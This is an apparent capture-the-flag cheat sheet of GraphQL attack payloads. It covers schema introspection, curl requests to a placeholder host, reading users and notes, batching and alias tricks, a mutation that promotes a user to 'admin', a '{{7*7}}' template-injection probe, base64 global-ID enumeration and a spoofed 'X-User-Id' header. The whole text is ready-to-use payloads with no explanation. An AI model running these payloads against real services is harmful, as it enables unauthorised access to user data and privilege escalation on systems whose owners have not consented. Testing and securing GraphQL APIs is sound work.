# GraphQL

## Try

```graphql
{__typename}
query{__schema{types{name}}}
query{__schema{queryType{name} mutationType{name}}}
```

## Introspection

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

```bash
curl -s http://HOST/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

## Common Reads

```graphql
query{users{id username role}}
query{user(id:1){id username role}}
query{me{id username role}}
query{notes{id title body author{id username}}}
query{flag}
```

## Batching

```json
[
  {"query":"query{me{id username}}"},
  {"query":"query{flag}"},
  {"query":"query{user(id:1){id username role}}"}
]
```

## Aliases

```graphql
query {
  a:user(id:1){id username}
  b:user(id:2){id username}
  c:user(id:3){id username}
}
```

## Mutation

```graphql
mutation{updateUser(id:1,role:"admin"){id username role}}
mutation{createNote(title:"x",body:"{{7*7}}"){id}}
mutation{login(username:"admin",password:"x"){token}}
```

## Global ID

```python
import base64

for x in ["User:1", "User:2", "Note:1", "Flag:1"]:
    print(x, base64.b64encode(x.encode()).decode())
```

```graphql
query{node(id:"VXNlcjox"){id ... on User{username role}}}
```

## Header / Method

```bash
curl http://HOST/graphql?query='{me{id}}'
curl -X POST http://HOST/graphql -H 'content-type: application/json' -d '{"query":"{me{id}}"}'
curl -X POST http://HOST/graphql -H 'content-type: application/graphql' --data '{me{id}}'
curl http://HOST/graphql -H 'Authorization: Bearer TOKEN' -H 'X-User-Id: 1'
```

